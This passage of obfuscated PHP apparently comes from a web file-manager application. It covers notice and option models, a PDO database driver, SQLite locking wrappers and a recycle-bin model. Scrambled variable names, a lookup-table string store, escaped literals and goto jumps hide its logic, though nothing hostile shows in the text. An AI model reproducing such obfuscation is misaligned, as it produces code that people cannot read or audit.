$‡ıÑ¸ç[2264], $‡ıÑ¸ç[760], $‡ıÑ¸ç[195]); } public function userNoticeGet($ØŞÏçğ¤ = false) { $this->initUserOption(); return parent::listData($ØŞÏçğ¤, $_SERVER[ïëó©ÒÚ][399], !0); } public function userNoticeAdd($¿Í¤Şéô) { $Õ£‹àš¤ =& $_SERVER[ïëó©ÒÚ]; $this->initUserOption(); $˜Ÿ–üıÔ = $this->findByKey($Õ£‹àš¤[2263], $¿Í¤Şéô[$Õ£‹àš¤[399]]); if ($˜Ÿ–üıÔ) { return !0; } $¨·Ü’ü = array($Õ£‹àš¤[2263] => $¿Í¤Şéô[$Õ£‹àš¤[399]], $Õ£‹àš¤[32] => $¿Í¤Şéô[$Õ£‹àš¤[32]], $Õ£‹àš¤[203] => $¿Í¤Şéô[$Õ£‹àš¤[203]], $Õ£‹àš¤[33] => isset($¿Í¤Şéô[$Õ£‹àš¤[33]]) ? $¿Í¤Şéô[$Õ£‹àš¤[33]] : 1, $Õ£‹àš¤[2264] => isset($¿Í¤Şéô[$Õ£‹àš¤[2264]]) ? $¿Í¤Şéô[$Õ£‹àš¤[2264]] : 0, $Õ£‹àš¤[760] => 0, $Õ£‹àš¤[195] => 0); return parent::insert($¨·Ü’ü); } public function userNoticeEdit($‡ÊÊ©±Ò, $Ò«­ƒ¡) { $this->initUserOption(); return parent::update($‡ÊÊ©±Ò, $Ò«­ƒ¡); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\x65\155\137\x6f\x70\164\x69\157\x6e"; protected $jsonField = array("\155\x65\156\165", "\x72\x6f\x6c\x65", "\x72\157\154\145\107\162\157\x75\x70", "\x72\x65\x67\151\x73\164", "\x65\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($öŒÙÈòĞ) { return "\x53\171\163\164\145\x6d\x4f\160\x74\151\157\156\137{$öŒÙÈòĞ}"; } protected function optionDefault($ìŞÆòë = '') { $ÌöÎëñÒ =& $_SERVER[ïëó©ÒÚ]; if ($ìŞÆòë == $ÌöÎëñÒ[12]) { return $GLOBALS[$ÌöÎëñÒ[6]][$ÌöÎëñÒ[381]]; } } } class SystemRecordModel extends ModelBaseLight { } goto a‰µââÛ´Ü; cˆ¤‰Ş˜Š”: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($‘¦£‰Ë = '') { $¾»ˆùäœ =& $_SERVER[ïëó©ÒÚ]; if (!class_exists($¾»ˆùäœ[917])) { think_exception(think_lang($¾»ˆùäœ[14]) . $¾»ˆùäœ[918]); } if (!empty($‘¦£‰Ë)) { $this->config = $‘¦£‰Ë; if (empty($this->config[$¾»ˆùäœ[17]])) { $this->config[$¾»ˆùäœ[17]] = array(); } } } public function connect($ˆÌÚÂÔû = '', $üµÑşá = 0) { $Õ˜¾²Ø =& $_SERVER[ïëó©ÒÚ]; if (!isset($this->linkID[$üµÑşá])) { if (empty($ˆÌÚÂÔû)) { $ˆÌÚÂÔû = $this->config; } $ÉšÙ½”Ø = !empty($ˆÌÚÂÔû[$Õ˜¾²Ø[17]][$Õ˜¾²Ø[18]]) ? $ˆÌÚÂÔû[$Õ˜¾²Ø[17]][$Õ˜¾²Ø[18]] : $this->pconnect; if ($ÉšÙ½”Ø) { $ˆÌÚÂÔû[$Õ˜¾²Ø[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$üµÑşá] = new PDO($ˆÌÚÂÔû[$Õ˜¾²Ø[919]], $ˆÌÚÂÔû[$Õ˜¾²Ø[891]], $ˆÌÚÂÔû[$Õ˜¾²Ø[892]], $ˆÌÚÂÔû[$Õ˜¾²Ø[17]]); } catch (PDOException $±’˜ïóŠ) { think_exception($±’˜ïóŠ->getMessage()); } $this->dbType = $this->_getDsnType($ˆÌÚÂÔû[$Õ˜¾²Ø[919]]); if (in_array($this->dbType, array($Õ˜¾²Ø[920], $Õ˜¾²Ø[921], $Õ˜¾²Ø[922], $Õ˜¾²Ø[923]))) { think_exception($Õ˜¾²Ø[924] . $this->dbType . $Õ˜¾²Ø[925] . $this->dbType . $Õ˜¾²Ø[926]); } if (!$this->linkID[$üµÑşá]) { think_exception($Õ˜¾²Ø[927]); } try { $this->linkID[$üµÑşá]->exec($Õ˜¾²Ø[928] . think_config($Õ˜¾²Ø[894])); } catch (Exception $±’˜ïóŠ) { } $this->connected = !0; if (1 != think_config($Õ˜¾²Ø[22])) { unset($this->config); } } return $this->linkID[$üµÑşá]; } public function free() { $this->PDOStatement = null; } public function query($÷‚ÁäŞş, $Àù²ß‡¸ = array()) { $Ô¼°ËÉ =& $_SERVER[ïëó©ÒÚ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $÷‚ÁäŞş; if (!empty($Àù²ß‡¸)) { $this->queryStr .= $Ô¼°ËÉ[929] . print_r($Àù²ß‡¸, !0) . $Ô¼°ËÉ[930]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ô¼°ËÉ[23], 1); think_status($Ô¼°ËÉ[24]); $this->PDOStatement = $this->_linkID->prepare($÷‚ÁäŞş); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $å™–­àğ = $this->PDOStatement->execute($Àù²ß‡¸); $this->debug(); if (!1 === $å™–­àğ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Òìì²´ß, $É€¦õ¹ = array()) { $¨ªï«ÏÒ =& $_SERVER[ïëó©ÒÚ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Òìì²´ß; if (!empty($É€¦õ¹)) { $this->queryStr .= $¨ªï«ÏÒ[929] . print_r($É€¦õ¹, !0) . $¨ªï«ÏÒ[930]; } $åÀŠ©¸Œ = !1; if ($this->dbType == $¨ªï«ÏÒ[923]) { if (preg_match($¨ªï«ÏÒ[931], $this->queryStr, $ú…µ¼›Ñ)) { $this->table = think_config($¨ªï«ÏÒ[932]) . str_ireplace(think_config($¨ªï«ÏÒ[933]), $¨ªï«ÏÒ[378], $ú…µ¼›Ñ[2]); $åÀŠ©¸Œ = (bool) $this->query($¨ªï«ÏÒ[934] . strtoupper($this->table) . $¨ªï«ÏÒ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¨ªï«ÏÒ[25], 1); think_status($¨ªï«ÏÒ[24]); $this->PDOStatement = $this->_linkID->prepare($Òìì²´ß); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $š¨ªî™ = $this->PDOStatement->execute($É€¦õ¹); $this->debug(); if (!1 === $š¨ªî™) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($åÀŠ©¸Œ || preg_match($¨ªï«ÏÒ[935], $Òìì²´ß)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‚Ï¸ìØ = $this->_linkID->commit(); $this->transTimes = 0; if (!$‚Ï¸ìØ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $²„×–‡Â = $this->_linkID->rollback(); $this->transTimes = 0; if (!$²„×–‡Â) { $this->error(); return !1; } } return !0; } private function getAll() { $ÉµñïÑ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ÉµñïÑ); return $ÉµñïÑ; } public function getFields($Ë¶èàØê) { $ø‚–ÇŸß =& $_SERVER[ïëó©ÒÚ]; $this->initConnect(!0); if (think_config($ø‚–ÇŸß[936])) { $úÊ¬äªœ = str_replace($ø‚–ÇŸß[937], $Ë¶èàØê, think_config($ø‚–ÇŸß[936])); } else { switch ($this->dbType) { case $ø‚–ÇŸß[920]: case $ø‚–ÇŸß[938]: $úÊ¬äªœ = "\x53\105\114\105\103\x54\40\x20\40\143\x6f\x6c\x75\155\156\137\x6e\141\155\145\x20\141\163\x20\47\116\x61\155\x65\x27\54\40\x20\x20\x64\x61\x74\141\x5f\164\171\x70\145\x20\141\x73\x20\x27\124\171\x70\145\x27\x2c\x20\40\40\143\x6f\x6c\x75\x6d\x6e\137\144\x65\x66\141\x75\x6c\x74\x20\x61\163\x20\x27\104\x65\146\x61\x75\154\164\47\54\40\40\40\x69\163\x5f\156\x75\x6c\154\141\142\154\145\x20\141\163\x20\x27\x4e\x75\x6c\x6c\x27\12\11\11\x46\122\x4f\115\11\151\x6e\146\157\x72\x6d\141\x74\151\157\156\137\x73\x63\150\145\155\141\x2e\164\141\142\x6c\x65\163\40\x41\x53\40\x74\12\x9\x9\112\x4f\111\116\11\x69\156\146\x6f\x72\155\141\164\x69\157\x6e\x5f\163\143\150\x65\x6d\141\x2e\143\x6f\154\x75\x6d\x6e\x73\40\101\123\x20\x63\12\11\x9\x4f\116\x20\40\x74\56\164\x61\142\x6c\x65\137\143\141\x74\141\154\157\x67\x20\x3d\x20\143\x2e\164\141\x62\x6c\145\137\x63\141\164\141\154\x6f\147\xa\11\11\101\x4e\x44\40\x74\x2e\164\141\142\x6c\145\137\163\x63\150\x65\x6d\141\40\x3d\x20\143\56\164\x61\x62\x6c\x65\137\163\143\150\145\155\141\xa\11\x9\x41\116\x44\40\x74\56\164\x61\x62\x6c\145\x5f\x6e\x61\x6d\145\40\x3d\x20\143\56\x74\141\142\x6c\145\x5f\156\x61\x6d\145\xa\11\11\127\110\x45\x52\x45\40\40\x20\164\56\x74\141\142\154\x65\x5f\x6e\x61\x6d\145\40\x3d\x20\47{$Ë¶èàØê}\47"; break; case $ø‚–ÇŸß[939]: $úÊ¬äªœ = $ø‚–ÇŸß[940] . $Ë¶èàØê . $ø‚–ÇŸß[941]; break; case $ø‚–ÇŸß[921]: case $ø‚–ÇŸß[923]: $úÊ¬äªœ = $ø‚–ÇŸß[942] . $ø‚–ÇŸß[943] . $ø‚–ÇŸß[944] . strtoupper($Ë¶èàØê) . $ø‚–ÇŸß[945] . strtoupper($Ë¶èàØê) . $ø‚–ÇŸß[946]; break; case $ø‚–ÇŸß[947]: $úÊ¬äªœ = $ø‚–ÇŸß[948] . $Ë¶èàØê . $ø‚–ÇŸß[949]; break; case $ø‚–ÇŸß[922]: break; case $ø‚–ÇŸß[950]: default: $úÊ¬äªœ = $ø‚–ÇŸß[951] . ($this->dbType == $ø‚–ÇŸß[950] ? "\140{$Ë¶èàØê}\x60" : $Ë¶èàØê); } } $¯õÎ•£€ = $this->query($úÊ¬äªœ); $»Šüøœ = array(); if ($¯õÎ•£€) { foreach ($¯õÎ•£€ as $ä£ŞíİÌ => $¶©â—¡÷) { $¶©â—¡÷ = array_change_key_case($¶©â—¡÷); $¶©â—¡÷[$ø‚–ÇŸß[32]] = isset($¶©â—¡÷[$ø‚–ÇŸß[32]]) ? $¶©â—¡÷[$ø‚–ÇŸß[32]] : $ø‚–ÇŸß[378]; $¶©â—¡÷[$ø‚–ÇŸß[33]] = isset($¶©â—¡÷[$ø‚–ÇŸß[33]]) ? $¶©â—¡÷[$ø‚–ÇŸß[33]] : $ø‚–ÇŸß[378]; $«¦îÌ = isset($¶©â—¡÷[$ø‚–ÇŸß[273]]) ? $¶©â—¡÷[$ø‚–ÇŸß[273]] : $¶©â—¡÷[$ø‚–ÇŸß[32]]; $»Šüøœ[$«¦îÌ] = array($ø‚–ÇŸß[32] => $«¦îÌ, $ø‚–ÇŸß[33] => $¶©â—¡÷[$ø‚–ÇŸß[33]], $ø‚–ÇŸß[35] => (bool) (isset($¶©â—¡÷[$ø‚–ÇŸß[103]]) && $¶©â—¡÷[$ø‚–ÇŸß[103]] === $ø‚–ÇŸß[12] || isset($¶©â—¡÷[$ø‚–ÇŸß[35]]) && $¶©â—¡÷[$ø‚–ÇŸß[35]] === $ø‚–ÇŸß[12]), $ø‚–ÇŸß[37] => isset($¶©â—¡÷[$ø‚–ÇŸß[37]]) ? $¶©â—¡÷[$ø‚–ÇŸß[37]] : (isset($¶©â—¡÷[$ø‚–ÇŸß[56]]) ? $¶©â—¡÷[$ø‚–ÇŸß[56]] : $ø‚–ÇŸß[378]), $ø‚–ÇŸß[39] => isset($¶©â—¡÷[$ø‚–ÇŸß[94]]) ? strtolower($¶©â—¡÷[$ø‚–ÇŸß[94]]) == $ø‚–ÇŸß[41] : (isset($¶©â—¡÷[$ø‚–ÇŸß[57]]) ? $¶©â—¡÷[$ø‚–ÇŸß[57]] : !1), $ø‚–ÇŸß[42] => isset($¶©â—¡÷[$ø‚–ÇŸß[952]]) ? strtolower($¶©â—¡÷[$ø‚–ÇŸß[952]]) == $ø‚–ÇŸß[44] : (isset($¶©â—¡÷[$ø‚–ÇŸß[94]]) ? $¶©â—¡÷[$ø‚–ÇŸß[94]] : !1)); } } return $»Šüøœ; } public function getTables($ë¸ñşí = '') { $Ö†”³í =& $_SERVER[ïëó©ÒÚ]; if (think_config($Ö†”³í[953])) { $Ç®¾ì· = str_replace($Ö†”³í[954], $ë¸ñşí, think_config($Ö†”³í[953])); } else { switch ($this->dbType) { case $Ö†”³í[921]: case $Ö†”³í[923]: $Ç®¾ì· = $Ö†”³í[955]; break; case $Ö†”³í[920]: case $Ö†”³í[938]: $Ç®¾ì· = $Ö†”³í[956]; break; case $Ö†”³í[947]: $Ç®¾ì· = $Ö†”³í[957]; break; case $Ö†”³í[922]: think_exception(think_lang($Ö†”³í[958]) . $Ö†”³í[959]); break; case $Ö†”³í[939]: $Ç®¾ì· = $Ö†”³í[45] . $Ö†”³í[46] . $Ö†”³í[47]; break; case $Ö†”³í[950]: default: if (!empty($ë¸ñşí)) { $Ç®¾ì· = $Ö†”³í[902] . $ë¸ñşí . $Ö†”³í[903]; } else { $Ç®¾ì· = $Ö†”³í[904]; } } } $ØÄêúÂÕ = $this->query($Ç®¾ì·); $µ£úÀìœ = array(); foreach ($ØÄêúÂÕ as $Â´ì˜é => $©¤»úÂ‘) { $µ£úÀìœ[$Â´ì˜é] = current($©¤»úÂ‘); } return $µ£úÀìœ; } protected function parseLimit($Í”â‰×º) { $ÓÉŞã• =& $_SERVER[ïëó©ÒÚ]; $èÇõ¨Åë = $ÓÉŞã•[12]; if (!empty($Í”â‰×º)) { switch ($this->dbType) { case $ÓÉŞã•[947]: case $ÓÉŞã•[939]: $Í”â‰×º = explode($ÓÉŞã•[50], $Í”â‰×º); if (count($Í”â‰×º) > 1) { $èÇõ¨Åë .= $ÓÉŞã•[51] . $Í”â‰×º[1] . $ÓÉŞã•[52] . $Í”â‰×º[0] . $ÓÉŞã•[53]; } else { $èÇõ¨Åë .= $ÓÉŞã•[51] . $Í”â‰×º[0] . $ÓÉŞã•[53]; } break; case $ÓÉŞã•[920]: case $ÓÉŞã•[938]: break; case $ÓÉŞã•[922]: break; case $ÓÉŞã•[921]: case $ÓÉŞã•[923]: break; case $ÓÉŞã•[950]: default: $èÇõ¨Åë .= $ÓÉŞã•[51] . $Í”â‰×º . $ÓÉŞã•[53]; } } return $èÇõ¨Åë; } public function parseKey(&$ˆÓøêğ, $³¤ıëÜƒ = true) { $û™¯ÑÂè =& $_SERVER[ïëó©ÒÚ]; if ($³¤ıëÜƒ) { $ˆÓøêğ = $this->parseKeyCheck($ˆÓøêğ); } if ($this->dbType == $û™¯ÑÂè[950]) { if ($ˆÓøêğ != $û™¯ÑÂè[188] && !preg_match($û™¯ÑÂè[914], $ˆÓøêğ)) { $ˆÓøêğ = $û™¯ÑÂè[385] . trim($ˆÓøêğ, $û™¯ÑÂè[385]) . $û™¯ÑÂè[385]; } return $ˆÓøêğ; } else { return parent::parseKey($ˆÓøêğ, $³¤ıëÜƒ); } } public function close() { $this->_linkID = null; } public function error() { $¬í³ã‚ =& $_SERVER[ïëó©ÒÚ]; if ($this->PDOStatement) { $¨íğ = $this->PDOStatement->errorInfo(); $this->error = $¨íğ[1] . $¬í³ã‚[4] . $¨íğ[2]; } else { $this->error = $¬í³ã‚[12]; } if ($¬í³ã‚[12] != $this->queryStr) { $this->error .= LNG($¬í³ã‚[48]) . $this->queryStr; } think_trace($this->error, $¬í³ã‚[12], $¬í³ã‚[49]); return $this->error; } public function escapeString($Ûéş¹…¿) { $—µ¿¼Š =& $_SERVER[ïëó©ÒÚ]; switch ($this->dbType) { case $—µ¿¼Š[947]: case $—µ¿¼Š[920]: case $—µ¿¼Š[938]: case $—µ¿¼Š[950]: return addslashes($Ûéş¹…¿); case $—µ¿¼Š[922]: case $—µ¿¼Š[939]: case $—µ¿¼Š[921]: case $—µ¿¼Š[923]: return str_ireplace($—µ¿¼Š[58], $—µ¿¼Š[59], $Ûéş¹…¿); } } protected function parseValue($ùúÜİí¢) { $ÉĞ³‡¹‚ =& $_SERVER[ïëó©ÒÚ]; if (is_string($ùúÜİí¢)) { $âÊ¬Üûå = strpos($ùúÜİí¢, $ÉĞ³‡¹‚[4]) === 0 && in_array($ùúÜİí¢, array_keys($this->bind)); $ùúÜİí¢ = $âÊ¬Üûå ? $this->escapeString($ùúÜİí¢) : $ÉĞ³‡¹‚[960] . $this->escapeString($ùúÜİí¢) . $ÉĞ³‡¹‚[960]; } elseif (isset($ùúÜİí¢[0]) && is_string($ùúÜİí¢[0]) && strtolower($ùúÜİí¢[0]) == $ÉĞ³‡¹‚[297]) { $ùúÜİí¢ = $this->escapeString($ùúÜİí¢[1]); } elseif (is_array($ùúÜİí¢)) { $ùúÜİí¢ = array_map(array($this, $ÉĞ³‡¹‚[961]), $ùúÜİí¢); } elseif (is_bool($ùúÜİí¢)) { $ùúÜİí¢ = $ùúÜİí¢ ? $ÉĞ³‡¹‚[88] : $ÉĞ³‡¹‚[197]; } elseif (is_null($ùúÜİí¢)) { $ùúÜİí¢ = $ÉĞ³‡¹‚[103]; } return $ùúÜİí¢; } public function getLastInsertId() { $ÆŸ½êİı =& $_SERVER[ïëó©ÒÚ]; switch ($this->dbType) { case $ÆŸ½êİı[947]: case $ÆŸ½êİı[939]: case $ÆŸ½êİı[920]: case $ÆŸ½êİı[938]: case $ÆŸ½êİı[922]: case $ÆŸ½êİı[950]: return $this->_linkID->lastInsertId(); case $ÆŸ½êİı[921]: case $ÆŸ½êİı[923]: $›á‰–ğº = $this->table; $­ğµÏ‡ = $this->query("\123\105\114\105\103\x54\x20{$›á‰–ğº}\x2e\x63\165\x72\162\x76\x61\x6c\x20\x63\x75\x72\162\166\141\x6c\40\106\122\117\x4d\x20\144\x75\x61\154"); return $­ğµÏ‡ ? $­ğµÏ‡[0][$ÆŸ½êİı[962]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($¶¬‘ãê×) { $±¿®±íù =& $_SERVER[ïëó©ÒÚ]; if (!CacheLock::fileLock($±¿®±íù[13])) { return !1; } $¡ä‰‰Í‚ = parent::query($¶¬‘ãê×); CacheLock::fileUnLock($±¿®±íù[13]); return $¡ä‰‰Í‚; } public function execute($‘Å˜®…) { $³ûêİú =& $_SERVER[ïëó©ÒÚ]; if (!CacheLock::fileLock($³ûêİú[13])) { return !1; } $µô¥•„ = parent::execute($‘Å˜®…); CacheLock::fileUnLock($³ûêİú[13]); return $µô¥•„; } } class DbSqlite3 extends DbSqlite3Base { public function query($ùİŒÚª) { $¸äÑñù =& $_SERVER[ïëó©ÒÚ]; if (!CacheLock::fileLock($¸äÑñù[13])) { return !1; } $—á³ş¡” = parent::query($ùİŒÚª); CacheLock::fileUnLock($¸äÑñù[13]); return $—á³ş¡”; } public function execute($„¢òı¦‡) { $Èé³Çµü =& $_SERVER[ïëó©ÒÚ]; if (!CacheLock::fileLock($Èé³Çµü[13])) { return !1; } $õÛ¥» Ã = parent::execute($„¢òı¦‡); CacheLock::fileUnLock($Èé³Çµü[13]); return $õÛ¥» Ã; } } goto AÍ¤­âÉ›‰; f”„­­: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\162\x63\145\x5f\x72\145\x63\x79\x63\154\x65"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\x54\151\155\145", "\164\151\155\145", "\151\x6e\163\x65\x72\164", "\146\x75\x6e\x63\164\151\157\x6e")); public function listData($¯ÓŠ²ì” = false) { $ÍÙ¹â‘­ =& $_SERVER[ïëó©ÒÚ]; $¯ÓŠ²ì” = $¯ÓŠ²ì” ? $¯ÓŠ²ì” : USER_ID; $¨¶éµÊˆ = $this->where(array($ÍÙ¹â‘­[1652] => $¯ÓŠ²ì”))->select(); return array_to_keyvalue($¨¶éµÊˆ, $ÍÙ¹â‘­[12], $ÍÙ¹â‘­[411]); } public function moveToRecycle($¬ÔÖ±®Ğ) { $™›»¥ =& $_SERVER[ïëó©ÒÚ]; $áƒ²‘ö„ = Model($™›»¥[1330]); $—•ÑğÓ = $áƒ²‘ö„->sourceInfo($¬ÔÖ±®Ğ); if (!$—•ÑğÓ || $—•ÑğÓ[$™›»¥[440]] == $™›»¥[88]) { return; } $ÙÎà´İ = array($™›»¥[426] => $¬ÔÖ±®Ğ, $™›»¥[1652] => USER_ID, $™›»¥[595] => $—•ÑğÓ[$™›»¥[420]], $™›»¥[596] => $—•ÑğÓ[$™›»¥[514]], $™›»¥[599] => $—•ÑğÓ[$™›»¥[530]]); $this->add($ÙÎà´İ); $this->recycleMove($¬ÔÖ±®Ğ, 1); if ($—•ÑğÓ[$™›»¥[419]] == $™›»¥[88]) { $³æ ªÈ³ = array($™›»¥[599] => array($™›»¥[559], $—•ÑğÓ[$™›»¥[530]] . $¬ÔÖ±®Ğ . $™›»¥[560])); $áƒ²‘ö„->where($³æ ªÈ³)->setField($™›»¥[440], 1); } } public function clear() { $this->remove(!1); } public function remove($Ì“€İÏ‡ = false, $¤º‹ƒŞË = false) { $Ÿ×®ÊÑ =& $_SERVER[ïëó©ÒÚ]; $¤º‹ƒŞË = $¤º‹ƒŞË ? $¤º‹ƒŞË : USER_ID; $ª îê°¼ = Model($Ÿ×®ÊÑ[1330]); $¶Œ½Á = $this->listData($¤º‹ƒŞË); $Ì“€İÏ‡ = $Ì“€İÏ‡ === !1 ? !1 : $Ì“€İÏ‡; $¨È„‹ôâ = array(); foreach ($¶Œ½Á as $‡º†ªÅ›) { if ($Ì“€İÏ‡ != !1 && !in_array($‡º†ªÅ›, $Ì“€İÏ‡)) { continue; } $›ÖòÒ¢Ğ = $ª îê°¼->sourceInfo($‡º†ªÅ›); $ª îê°¼->remove($‡º†ªÅ›, !1); $›ô®¢œü = $›ÖòÒ¢Ğ[$Ÿ×®ÊÑ[420]] . $Ÿ×®ÊÑ[11] . $›ÖòÒ¢Ğ[$Ÿ×®ÊÑ[514]]; $¨È„‹ôâ[$›ô®¢œü] = array($Ÿ×®ÊÑ[595] => $›ÖòÒ¢Ğ[$Ÿ×®ÊÑ[420]], $Ÿ×®ÊÑ[514] => $›ÖòÒ¢Ğ[$Ÿ×®ÊÑ[514]]); $this->where(array($Ÿ×®ÊÑ[411] => $‡º†ªÅ›))->delete(); } foreach ($¨È„‹ôâ as $À¼¥…‰µ) { $ª îê°¼->targetSpaceUpdate($À¼¥…‰µ[$Ÿ×®ÊÑ[420]], $À¼¥…‰µ[$Ÿ×®ÊÑ[514]]); } } public function restore($­óİ¦‚‘ = false) { $şÅøÙØ“ = $this->listData(); $this->_restoreSource($şÅøÙØ“, $­óİ¦‚‘); } public function removeUserAll($Š´¦£†) { $this->remove(!1, $Š´¦£†); } private function _restoreSource($‚ÚÃÔ…, $Ôß°ÓêÂ) { $ô›½½ı =& $_SERVER[ïëó©ÒÚ]; $Õôšœú€ = Model($ô›½½ı[1330]); $Ôß°ÓêÂ = $Ôß°ÓêÂ == !1 ? !1 : $Ôß°ÓêÂ; if (!$‚ÚÃÔ…) { return !0; } $›í¥ë®ç = array(); foreach ($‚ÚÃÔ… as $ê´Ö½„¼) { if ($Ôß°ÓêÂ != !1 && !in_array($ê´Ö½„¼, $Ôß°ÓêÂ)) { continue; } $âô˜û¿ = $Õôšœú€->sourceInfo($ê´Ö½„¼); $½ÙûÄ¼… = $Õôšœú€->sourceInfo($âô˜û¿[$ô›½½ı[441]]); if ($½ÙûÄ¼…[$ô›½½ı[440]] == $ô›½½ı[88]) { continue; } $Õôšœú€->lockMoveStart($ê´Ö½„¼); $this->recycleMove($ê´Ö½„¼, 0); if ($âô˜û¿[$ô›½½ı[419]] == $ô›½½ı[88]) { $§şıî€Á = array($ô›½½ı[599] => array($ô›½½ı[559], $âô˜û¿[$ô›½½ı[530]] . $ê´Ö½„¼ . $ô›½½ı[560])); $Õôšœú€->where($§şıî€Á)->setField($ô›½½ı[440], 0); $this->restoreFolderChildren($ê´Ö½„¼, $‚ÚÃÔ…); } $this->where(array($ô›½½ı[411] => $ê´Ö½„¼))->delete(); $Õôšœú€->folderSizeReset($âô˜û¿[$ô›½½ı[441]]); $›í¥ë®ç[] = $âô˜û¿[$ô›½½ı[441]]; if ($âô˜û¿[$ô›½½ı[419]] == $ô›½½ı[88]) { $›í¥ë®ç[] = $ê´Ö½„¼; } $Õôšœú€->lockMoveEnd($ê´Ö½„¼); } $Õôšœú€->updateModifyTime($›í¥ë®ç); } private function restoreFolderChildren($àñÔœÏÛ, $ıä±ş¥) { $ÈäÅÜ­ï =& $_SERVER[ïëó©ÒÚ]; $ŸÏá¦À = Model($ÈäÅÜ­ï[1330]); $ Ùú‡š = array($ÈäÅÜ­ï[411] => array($ÈäÅÜ­ï[7], array())); foreach ($ıä±ş¥ as $½’‚¤¶Ş) { if ($½’‚¤¶Ş == $àñÔœÏÛ) { continue; } if (!$ŸÏá¦À->isParentOf($àñÔœÏÛ, $½’‚¤¶Ş)) { continue; } $ÑµÈ†³à = $ŸÏá¦À->sourceInfo($½’‚¤¶Ş); if ($ÑµÈ†³à[$ÈäÅÜ­ï[419]] == $ÈäÅÜ­ï[88]) { $ Ùú‡š[] = array($ÈäÅÜ­ï[599] => array($ÈäÅÜ­ï[559], $ÑµÈ†³à[$ÈäÅÜ­ï[530]] . $½’‚¤¶Ş . $ÈäÅÜ­ï[560])); } else { $ Ùú‡š[$ÈäÅÜ­ï[411]][1][] = $½’‚¤¶Ş; } } if (!$ Ùú‡š[$ÈäÅÜ­ï[411]][1]) { unset($ Ùú‡š[$ÈäÅÜ­ï[411]]); } if (!$ Ùú‡š) { return; } $ Ùú‡š[$ÈäÅÜ­ï[411]][1] = array_unique($ Ùú‡š[$ÈäÅÜ­ï[411]][1]); $ Ùú‡š[$ÈäÅÜ­ï[1003]] = $ÈäÅÜ­ï[1931]; $ŸÏá¦À->where($ Ùú‡š)->setField($ÈäÅÜ­ï[440], 1); } private function recycleMove($¢­ÍÀ©ö, $ŒáÑÉ = 1) { $“ş™ğ¸ğ =& $_SERVER[ïëó©ÒÚ]; $“ÛÄï¼£ = Model($“ş™ğ¸ğ[1330]); $·¦Ò¹› = Model($“ş™ğ¸ğ[2142]); $ıÕâõŞ = array($“ş™ğ¸ğ[411] => $¢­ÍÀ©ö); if ($ŒáÑÉ) { $“ÛÄï¼£->where($ıÕâõŞ)->setField($“ş™ğ¸ğ[440], 1); $·¦Ò¹›->eventRecycle($¢­ÍÀ©ö, $“ş™ğ¸ğ[2143]); } else { $ÈÏ÷Â­© = $“ÛÄï¼£->where($ıÕâõŞ)->find(); $Ğ³¿¬Á = $ÈÏ÷Â­©[$“ş™ğ¸ğ[419]] == $“ş™ğ¸ğ[88]; $Åê‰ïİö = $“ÛÄï¼£->fileNameAuto($ÈÏ÷Â­©[$“ş™ğ¸ğ[441]], $ÈÏ÷Â­©[$“ş™ğ¸ğ[32]], REPEAT_RENAME_FOLDER, $Ğ³¿¬Á); if ($Åê‰ïİö != $ÈÏ÷Â­©[$“ş™ğ¸ğ[32]]) { $“ÛÄï¼£->rename($¢­ÍÀ©ö, $Åê‰ïİö); } $“ÛÄï¼£->where($ıÕâõŞ)->setField($“ş™ğ¸ğ[440], 0); $·¦Ò¹›->eventRecycle($¢­ÍÀ©ö, $“ş™ğ¸ğ[2144]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\x73\157\x75\x72\143\145\123\145\143\x72\x65\x74\114\x69\x73\x74"; public $field = array("\x73\157\x75\x72\143\x65\111\x44", "\x74\x79\160\x65\x49\104", "\x63\162\145\141\164\145\x55\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\x73\x74\157\x72\141\x67\x65\114\x69\163\x74"; public $field = array("\x6e\x61\x6d\145", "\x73\151\x7a\x65\x4d\x61\170", "\163\x79\x73\164\x65\155", "\144\x65\x66\x61\165\x6c\164", "\144\162\151\x76\145\162", "\x63\157\x6e\x66\151\147"); public function listData($ÎõÒ¨¼ = false, $ìùÄÀØ¡ = "\155\x6f\144\151\x66\171\124\x69\155\145", $ñÆŠ˜ø = false) { $†âúîˆâ =& $_SERVER[ïëó©ÒÚ]; $ô¼£ïáì = parent::listData($ÎõÒ¨¼, $ìùÄÀØ¡, $ñÆŠ˜ø); if ($ÎõÒ¨¼) { return $ô¼£ïáì; } $„»¦Ù = $this->ioSizeUseGet(array_to_keyvalue($ô¼£ïáì, $†âúîˆâ[12], $†âúîˆâ[399])); foreach ($ô¼£ïáì as $š›‡•–˜ => $š˜ÌÓÏÏ) { unset($ô¼£ïáì[$š›‡•–˜][$†âúîˆâ[6]]); $ô¼£ïáì[$š›‡•–˜][$†âúîˆâ[1822]] = isset($„»¦Ù[$š˜ÌÓÏÏ[$†âúîˆâ[399]]]) ? $„»¦Ù[$š˜ÌÓÏÏ[$†âúîˆâ[399]]] : 0; } return $ô¼£ïáì; } public function ioSizeUseGet($À«ÎÊş¶) { $ôŠíÈ©Ş =& $_SERVER[ïëó©ÒÚ]; if (!$À«ÎÊş¶) { return array(); } $„¶¸ÄÁ  = $ôŠíÈ©Ş[2145] . 